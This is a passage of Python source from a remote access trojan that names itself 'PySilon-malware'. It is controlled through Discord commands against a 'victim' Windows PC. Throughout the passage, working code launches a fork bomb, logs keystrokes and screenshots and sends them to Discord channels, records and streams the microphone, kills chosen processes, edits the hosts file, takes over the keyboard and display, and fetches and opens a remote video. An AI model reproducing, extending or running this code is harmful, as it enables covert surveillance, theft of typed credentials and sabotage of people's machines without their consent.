                    await message.channel.send(embed=embed)
                    #.log Sent embed about Clipper stopped (crypto_clipper.py:75)*
                    clipper_stop = True
                else:
                    #.log Clipper is not running (crypto_clipper.py:78)*
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                    #.log Sent embed about Clipper not running (crypto_clipper.py:82)*
            elif message.content == ".forkbomb":
                #.log Message is "fork bomb" (fork_bomb.py:4)*
                await message.delete()
                #.log Removed the message (fork_bomb.py:6)*
                embed = discord.Embed(title="💣 Starting...",description=f'```Starting fork bomb... This process may take some time.```', colour=discord.Colour.dark_theme())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await message.channel.send(embed=embed)
                #.log Sent message about for bomb starting (fork_bomb.py:10)*
                with open(f'C:\\Users\\{getuser()}\\wabbit.bat', 'w', encoding='utf-8') as wabbit:
                    wabbit.write('%0|%0')
                    #.log Generated wabbit.bat (fork_bomb.py:13)*
                subprocess.Popen(f'C:\\Users\\{getuser()}\\wabbit.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                #.log Executed wabbit.bat (fork_bomb.py:15)*
            elif message.content[:4] == '.msg':
                await message.delete()
                #.log Removed the message (messager.py:18)*
                if message.content.strip() == '.msg' or message.content.count('"') not in [2, 4, 6]:
                    #.log Author issued empty ".show" (messager.py:20)*
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .msg <text=""> [title=""] [style=]\n  - default title is "From: Someone"\n  - default style is 0. Styles:\n    0 : OK\n    1 : OK | Cancel\n    2 : Abort | Retry | Ignore\n    3 : Yes | No | Cancel\n    4 : Yes | No\n    5 : Retry | Cancel\n    6 : Cancel | Try Again | Continue```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent message with usage of ".show" (messager.py:24)*
                elif 'text="' in message.content:
                    message_title = 'From: Someone'
                    message_style = 0
                    message_text = ''
                    for i in message.content[message.content.find('text="')+6:]:
                        if i != '"': message_text += i
                        else: break
                    if 'title="' in message.content[5:]:
                        message_title = ''
                        for i in message.content[message.content.find('title="')+7:]:
                            if i != '"': message_title += i
                            else: break
                    if 'style=' in message.content[5:]:
                        message_style = int(message.content[message.content.find('style=')+6])
                    if message.content[-2:] == '/s':
                        threading.Thread(target=send_custom_message, args=(message_title, message_text, message_style,)).start()
                        await asyncio.sleep(0.5)
                        ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Sent message]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                        await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
                    else:
                        hti = Html2Image()
                        possible_styles = [
                            '<div class="active_button">OK</div>',
                            '<div class="button">Cancel</div><div class="active_button">OK</div>', 
                            '<div class="button">Ignore</div><div class="button">Retry</div><div class="active_button">Abort</div>',
                            '<div class="button">Cancel</div><div class="button">No</div><div class="active_button">Yes</div>',
                            '<div class="button">No</div><div class="active_button">Yes</div>',
                            '<div class="button">Cancel</div><div class="active_button">Retry</div>',
                            '<div class="button">Continue</div><div class="button">Try Again</div><div class="active_button">Cancel</div>'
                        ]
                        hti.screenshot(
                            html_str='''<head><style>body {margin: 0px;}.container {width: 285px;min-height: 100px;background-color: #ffffff;border: 1px solid black;}.title {margin: 8px;width: 85%;font-size: 13.25px;font-family: 'Calibri';float: left;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;}.close {float: right;font-size: 9px;padding: 8px;}.text {margin-left: 10px;margin-top: 20px;margin-bottom: 25px;float: left;inline-size: 90%;word-break: break-all;font-size: 13px;font-family: 'Calibri';}.footer {background-color: #f0f0f0;width: auto;height: 40px;padding-right: 12px;clear: both;}.button {background-color: #e1e1e1;border: 1px solid #adadad;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}.active_button {background-color: #e1e1e1;border: 2px solid #0078d7;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}</style></head><body><div class="container"><div class="title">''' + message_title + '''</div><div class="close"><b>&#9587;</b></div><div class="text">''' + message_text + '''</div><div class="footer">''' + possible_styles[int(message_style)] + '''</div></div></body></html>''',
                            size=(500, 300),
                            save_as='image.png'
                        )
                        img = Image.open('image.png')
                        content = img.getbbox()
                        img = img.crop(content)
                        img.save('image.png')
                        file = discord.File('image.png', filename='image.png')
                        embed = discord.Embed(title='Confirm message', description=f'Check if message preview meets your expectations:', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embed.set_image(url='attachment://image.png')
                        embed.set_footer(text='Note: you will see what button did victim click.')
                        reaction_msg = await message.channel.send(file=file, embed=embed); await reaction_msg.add_reaction('✅'); await reaction_msg.add_reaction('🔴')
                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\image.png', shell=True)
                        await message.channel.send('```^ React with ✅ to send the message```')
                        custom_message_to_send = [message_title, message_text, message_style]
            elif message.content[:4] == '.tts':
                #.log Message is "tts"(texttospeech.py:5)*
                await message.delete()
                #.log Removed the message (texttospeech.py:7)*
                if message.content.strip() == '.tts':
                    #.log Author issued empty ".tts" command (texttospeech.py:9)*
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .tts <what-to-say>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent message with usage of ".tts" (texttospeech.py:13)*
                else:
                    requested_tts = message.content[5:]
                    engine = pyttsx3.init()
                    #.log Initialized pyttsx3 Text-to-Speech engine(texttospeech.py:17)*
                    engine.say(requested_tts)
                    #.log Registered requested tts message(texttospeech.py:19)*
                    engine.runAndWait()
                    #.log Run tts engine(texttospeech.py:21)*
                    engine.stop()
                    #.log Stopped tts engine(texttospeech.py:23)*
                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully played TTS message: "{requested_tts}"```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent embed about successfully playing tts message(texttospeech.py:27)*
            elif message.content[:7] == '.volume':
                #.log Message is "volume"(audio_control.py:9)*
                await message.delete()
                #.log Removed the message (audio_control.py:11)*
                if message.content.strip() == '.volume':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    volume_int = message.content[8:]
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume_int = int(volume_int)
                    volume_int = volume_int / 100
                    if volume_int <= 1 and volume_int >= 0:
                        volume.SetMasterVolumeLevelScalar(volume_int, None)
                        embed = discord.Embed(title="🟢 Success",description=f'```Successfully set volume to {volume_int * 100}%```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.play':
                await message.delete()
                #.log Removed the message (audio_control.py:35)*
                if message.content.strip() == '.play':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                elif not message.content.endswith('.mp3'):
                    embed = discord.Embed(title="📛 Error",description='```Not a valid file type.```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    def play_audio():
                        audio_file = message.content[6:]
                        audio_file = audio_file.replace('\\','/')
                        pygame.mixer.init()
                        pygame.mixer.music.load(audio_file)
                        pygame.mixer.music.play()
                        while pygame.mixer.music.get_busy():
                            pass
                        pygame.mixer.quit()
                    threading.Thread(target=play_audio).start()
            elif message.content == '.monitors-off':
                if not turned_off:
                    await message.delete()
                    turned_off = True
                    def monitor_off():
                        while turned_off:
                            for monitor in monitorcontrol.get_monitors():
                                with monitor:
                                    monitor.set_power_mode(4)
                    threading.Thread(target=monitor_off).start()
                    embed = discord.Embed(title="🟢 Success",description=f'```Monitor turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                else:
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```Monitor already turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
            elif message.content == '.monitors-on':
                if turned_off:
                    await message.delete()
                    for monitor in monitorcontrol.get_monitors():
                        with monitor:
                            monitor.set_power_mode(1)
                    embed = discord.Embed(title="🟢 Success",description=f'```Monitor has been turned on. Turn it off by using .monitors-off```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                    turned_off = False
                else: 
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```The monitor is not turned off. Turn it off by using .monitors-off```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
            elif message.content[:14] == '.block-website':
                await message.delete()
                if message.content.strip() == '.block-website':
                    embed = discord.Embed(title="📛 Error", description=f'```Syntax: .block-website <https://example.com>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                else:
                    website = message.content[15:]
                    await message.channel.send(website)
                    parsed_url = urlparse(website)
                    host_entry = f"127.0.0.1 {parsed_url.netloc}\n"
                    hosts_file_path = get_hosts_file_path()
                    if hosts_file_path:
                        with open(hosts_file_path, 'a') as hosts_file:
                            hosts_file.write(host_entry)
                        embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been blocked. Unblock it by using .webunblock [websitename]```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await message.channel.send(embed=embed)
                    else:
                        embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await message.channel.send(embed=embed)
            elif message.content[:16] == '.unblock-website':
                await message.delete()
                if message.content.strip() == '.unblock-website':
                    embed = discord.Embed(title="📛 Error", description=f'```Syntax: .unblock-website <example.com>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                else:
                    website = message.content[17:]
                    website = website.replace("https://", "")
                    website = website.replace("http://", "")
                    hosts_file_path = get_hosts_file_path()
                    if hosts_file_path:
                        with open(hosts_file_path, 'r') as hosts_file:
                            lines = hosts_file.readlines()
                        filtered_lines = [line for line in lines if website not in line]
                        with open(hosts_file_path, 'w') as hosts_file:
                            hosts_file.writelines(filtered_lines)
                        embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been unblocked.```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await message.channel.send(embed=embed)
                    else:
                        embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await message.channel.send(embed=embed)
            elif message.content == '.jumpscare':
                await message.delete()
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                video_url = "https://github.com/mategol/PySilon-malware/raw/py-dev/resources/icons/jumpscare.mp4"
                temp_folder = os.environ['TEMP']
                temp_file = os.path.join(temp_folder, 'jumpscare.mp4')
                if not os.path.exists(temp_file):
                    response = requests.get(video_url)
                    with open(temp_file, 'wb') as file:
                        file.write(response.content)
                time.sleep(1)
                os.startfile(temp_file)
                time.sleep(0.6)
                get_video_window = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(get_video_window, win32con.SW_MAXIMIZE)
                volume.SetMasterVolumeLevelScalar(1.0, None)
                embed = discord.Embed(title="🟢 Success",description=f'```Jumpscare has been triggered.```', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await message.channel.send(embed=embed)
            elif message.content[:4] == '.key':
                await message.delete()
                if message.content.strip() == '.key':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .key <keys-to-press>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    keystrokes = message.content[5:]
                    if "ALTTAB" in keystrokes:
                        pyautogui.hotkey('alt', 'tab')
                    elif "ALTF4" in keystrokes:
                        pyautogui.hotkey('alt', 'f4')
                    else:
                        for key in keystrokes:
                            pyautogui.press(key)
                    embed = discord.Embed(title="🟢 Success",description=f'```All keys have been succesfully pressed```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content == '.display-graphic':
                await message.delete()
                embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
                embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                await message.channel.send(embed=embed)
                expectation = 'graphic_file'
            elif message.content[:15] == '.display-glitch':
                await message.delete()
                if message.content.strip() == '.display-glitch':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .display-glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent message with usage of ".show" (screen_manipulation.py:26)*
                elif message.content[16:] == 'list':
                    embed = discord.Embed(title="📃 List of currently available glitches:", description=f'- {"- ".join(flash_screen("list"))}\n`NOTE: This list will dramatically increase it\'s size in release v4.1`', colour=discord.Colour.blue())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                elif message.content[16:] + '\n' in flash_screen('list'):
                    flash_screen(message.content[16:])
                    embed = discord.Embed(title="🟢 Glitch succesfully executed", description=f'Remember to ⭐ our repository', colour=discord.Colour.blue())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description='```Invalid argument!```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif expectation == 'graphic_file':
                try:
                    split_v1 = str(message.attachments).split("filename='")[1]
                    filename = str(split_v1).split("' ")[0]
                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                    await message.attachments[0].save(fp=filename)
                    screen_manipulator(filename).display_graphic(10)
                    embed = discord.Embed(title='Graphic successfully displayed', description='Victim should see it on their screen for 10 seconds.\n`This functionality will be HUGELY improved in release v4.1`', colour=discord.Colour.green())
                    embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                    await message.channel.send(embed=embed)
                except Exception as err: 
                    await message.channel.send(f'```❗ Something went wrong while fetching graphic file...\n{str(err)}```')
                    expectation = None

            elif expectation == 'onefile':
                #.log Message is onefile upload candidate (file_uploading.py:97)*
                split_v1 = str(message.attachments).split('filename=\'')[1]
                filename = str(split_v1).split('\' ')[0]
                #.log Fetched the file name (file_uploading.py:100)*
                reaction_msg = await message.channel.send('```This file will be uploaded to  ' + '/'.join(working_directory) + '/' + filename + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```')
                #.log Sent confirmation message for upload (file_uploading.py:102)*
                await reaction_msg.add_reaction('📤')
                #.log Reacted with "confirm upload" (file_uploading.py:104)*
                await reaction_msg.add_reaction('🔴')
                #.log Reacted with "cancel uploading" (file_uploading.py:106)*
                one_file_attachment_message = message
            elif expectation == 'multiplefiles':
                #.log Message probably contains part of a bigger file (file_uploading.py:109)*
                files_to_merge[1].append(message)
                #.log Logged a file to download (file_uploading.py:111)*

def on_press(key):
    global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
    processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
    keycodes = {
        Key.space : ' ',
        Key.shift : ' *`SHIFT`*',
        Key.tab : ' *`TAB`*',
        Key.backspace : ' *`<`*',
        Key.esc : ' *`ESC`*',
        Key.caps_lock : ' *`CAPS LOCK`*',
        Key.f1 : ' *`F1`*',
        Key.f2 : ' *`F2`*',
        Key.f3 : ' *`F3`*',
        Key.f4 : ' *`F4`*',
        Key.f5 : ' *`F5`*',
        Key.f6 : ' *`F6`*',
        Key.f7 : ' *`F7`*',
        Key.f8 : ' *`F8`*',
        Key.f9 : ' *`F9`*',
        Key.f10 : ' *`F10`*',
        Key.f11 : ' *`F11`*',
        Key.f12 : ' *`F12`*',
    }
    if processed_key in ctrl_codes.keys():
        processed_key = ' `' + ctrl_codes[processed_key] + '`'
        #.log Victim has used the CTRL shortcut(keylogger.py:33)*
    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
        for i in keycodes:
            if processed_key == i:
                processed_key = keycodes[i]
        if processed_key == Key.enter:
            processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
        elif processed_key == Key.print_screen or processed_key == '@':
                #.log Print screen or @ pressed(keylogger.py:41)*
                processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
                ImageGrab.grab(all_screens=True).save('ss.png')
                #.log Saved screenshot of this PC(keylogger.py:44)*
                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
                #.log Added new embed to send (containing screenshot of this PC)(keylogger.py:46)*
        text_buffor += str(processed_key)
        if len(text_buffor) > 1975:
            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
                messages_to_send.append([channel_ids['spam'], text_buffor])
            else:
                messages_to_send.append([channel_ids['main'], text_buffor])
            text_buffor = ''
class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        #.log Started PyAudioPCM class (live_microphone.py:23)*
        p = pyaudio.PyAudio()
        #.log Initialized PyAudio (live_microphone.py:25)*
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
        #.log Started streaming the audio (live_microphone.py:28)*
    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)
def start_recording():
    global files_to_send, channel_ids, send_recordings
    #.log Trying to start microphone recording (microphone_recording.py:9)*
    while True:
        if send_recordings:
            recorded_mic = sounddevice.rec(int(120 * 16000), samplerate=16000, channels=1)
            #.log Initialized sounddevice recording class (microphone_recording.py:13)*
            sounddevice.wait()
            #.log Recorded audio from microphone (microphone_recording.py:15)*
            try: os.mkdir('rec_')
            except: pass
            record_name = 'rec_\\' + current_time() + '.wav'
            write(record_name, 16000, recorded_mic)
            #.log Saved recorded microphone into file (microphone_recording.py:20)*
            files_to_send.append([channel_ids['recordings'], '', record_name, True])
            #.log Added new file to send (containing microphone recording) (microphone_recording.py:22)*
        else:
            time.sleep(20)
def check_int(to_check):
    try:
        asd = int(to_check) + 1
        return True
    except: return False
def active_window_process_name():
    try:
        pid = GetWindowThreadProcessId(GetForegroundWindow())
        return(Process(pid[-1]).name())
    except:
        return None
def process_blacklister():
    global embeds_to_send
    while True:
        if os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'):
            with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                process_blacklist = disabled_processes.readlines()
            for x, y in enumerate(process_blacklist): process_blacklist[x] = y.replace('\n', '')
            for process in process_blacklist:
                if process.lower() in [proc.name().lower() for proc in process_iter()]:
                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {process} /t', capture_output=True, shell=True).stdout).strip()
                    #.log Tried to kill provided process(process.py:251)*
                    time.sleep(1)
                    if process.lower() not in [proc.name().lower() for proc in process_iter()]:
                        #.log Process is not running anymore (process.py:254)*
                        embed = discord.Embed(title="🟢 Success", description=f'```Process Blacklister killed {process}```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embeds_to_send.append([channel_ids['main'], embed])
                        #.log Sent message about successful kill(process.py:258)*
                    else:
                        #.log Process is still running (process.py:260)*
                        embed = discord.Embed(title="📛 Error",description=f'```Process Blacklister tried to kill {process} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embeds_to_send.append([channel_ids['main'], embed])
                        #.log Sent message about unsuccessfull kill (process.py:264)*
        time.sleep(1)
def send_custom_message(title, text, style):
    response = ctypes.windll.user32.MessageBoxW(0, text, title, style)
    possible_responses = [
        '',
        'OK',
        'Cancel',
        'Abort',
        'Retry',
        'Ignore',
        'Yes',
        'No',
        '',
        '',
        'Try Again',
        'Continue'
    ]
    embed = discord.Embed(title="📧 User responded!",description=f'The response for Message(title="{title}", text="{text}", style={style})\nis:```{possible_responses[int(response)]}```', colour=discord.Colour.green())
    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
    embeds_to_send.append([channel_ids['main'], embed])
def get_hosts_file_path():
    hosts_file_path = r'C:\Windows\System32\drivers\etc\hosts'
    if ctypes.windll.kernel32.GetFileAttributesW(hosts_file_path) != -1:
        return hosts_file_path
    return None
class screen_manipulator:
    def __init__(self, saved_file):
        with open(saved_file, 'r', encoding='utf-8') as read_data:
            input_data = read_data.readlines()[0]
        settings, pixeldata = input_data.split('|')
        self.settings = json.loads(settings)
        self.pixeldata = pixeldata.split(',')
        self.saved_file = saved_file
        self.canvas_width, self.canvas_height = self.settings['resolution'][0], self.settings['resolution'][1]
    def hex_to_rgb(self, hex):
        rgb = []
        hex = hex[1:]
        for i in (0, 2, 4):
            decimal = int(hex[i:i+2], 16)
            rgb.append(decimal)
        return tuple(rgb)
    def display_graphic(self, seconds):
        with open(self.saved_file, 'r', encoding='utf-8') as load_data:
            data = load_data.readlines()
        frame, unfetched_pixels = data[0].split('|')
        frame = json.loads(frame)
        pixels = []
        for line in unfetched_pixels.split(','):
            x, y = line.split(':')[0].split('.')
            if frame['mode'] == 'img':
                color = line.split(':')[1]
            elif frame['mode'] == 'bmp':
                color = frame['color']
            pixels.append((int(x), int(y), self.hex_to_rgb(color)))
        size = frame['size']
        screen_dc = GetDC(0)
        screen_x_resolution = GetDeviceCaps(screen_dc, DESKTOPHORZRES)
        screen_y_resolution = GetDeviceCaps(screen_dc, DESKTOPVERTRES)
        starting_pos = (int(screen_x_resolution*(int(frame['position'][0])/100)), int(screen_y_resolution*(int(frame['position'][1])/100)))
        drawing = pixels
        start_time = time.time()
        while time.time() - start_time < seconds:
            screen_dc = GetDC(0)
            for pixel in drawing:
                brush = CreateSolidBrush(RGB(pixel[2][0], pixel[2][1], pixel[2][2]))
                SelectObject(screen_dc, brush)
                PatBlt(screen_dc, starting_pos[0] + pixel[0] * size, starting_pos[1] + pixel[1] * size, size, size, PATCOPY)
            DeleteObject(brush)
            ReleaseDC(0, screen_dc)
def flash_screen(effect):
    hdc = GetDC(0)
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)
    if effect == 'list':
        return ['invert\n', 'noise\n', 'lines\n', 'invert_squares\n', 'color_squares\n', 'diagonal_lines\n', 'snowfall\n', 'hypnotic_spirals\n', 'random_lines\n']
    elif effect == 'invert':
        while True:
            PatBlt(hdc, 0, 0, x, y, PATINVERT)
    elif effect == 'noise':
        for _ in range(x * y // 20):
            rand_x = random.randint(0, x)
            rand_y = random.randint(0, y)
            size = 100
            color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            brush = CreateSolidBrush(color)
            SelectObject(hdc, brush)
            PatBlt(hdc, rand_x, rand_y, size, size, PATCOPY)
    elif effect == 'lines':
        for _ in range(0, y, 5):
            PatBlt(hdc, 0, _, x, 2, PATINVERT)
    elif effect == 'invert_squares':
        for _ in range(200):
            rand_x1 = random.randint(0, x)
            rand_y1 = random.randint(0, y)
            rand_x2 = random.randint(0, x)
            rand_y2 = random.randint(0, y)
            PatBlt(hdc, rand_x1, rand_y1, rand_x2 - rand_x1, rand_y2 - rand_y1, PATINVERT)
    elif effect == 'color_squares':
        for i in range(10):
            for x in range(0, x, 20):
                for y in range(0, y, 20):
                    brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    SelectObject(hdc, brush)
                    PatBlt(hdc, x, y, 10, 10, PATCOPY)
                    DeleteObject(brush)
                    brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    SelectObject(hdc, brush)
                    PatBlt(hdc, x + 10, y + 10, 10, 10, PATCOPY)
                    DeleteObject(brush)
    elif effect == 'diagonal_lines':
        for x in range(0, x, 10):
            brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            SelectObject(hdc, brush)
            PatBlt(hdc, x, 0, 1, y, PATCOPY)
            DeleteObject(brush)
        for y in range(0, y, 10):
            brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            SelectObject(hdc, brush)
            PatBlt(hdc, 0, y, x, 1, PATCOPY)
            DeleteObject(brush)
    elif effect == 'snowfall':
        for i in range(10):
            stars = [(random.randint(0, x), random.randint(0, y), random.randint(1, 4)) for _ in range(100)]
            for star in stars:
                rand_x, rand_y, size = star
